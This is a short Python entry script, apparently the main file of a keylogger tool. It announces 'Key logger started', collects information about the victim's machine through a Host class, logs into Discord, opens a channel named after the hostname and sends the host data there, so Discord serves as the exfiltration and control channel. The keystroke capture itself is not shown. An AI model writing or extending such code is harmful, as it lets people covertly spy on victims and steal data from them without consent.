from classes.Host import Host
from discord_util import discord

if __name__ == '__main__':
    print("Key logger started")
    
    host = Host()
    print(host)

    discord.login()
    discord.create_channel("Session " + str(host.hostname))
    discord.send_message(host)
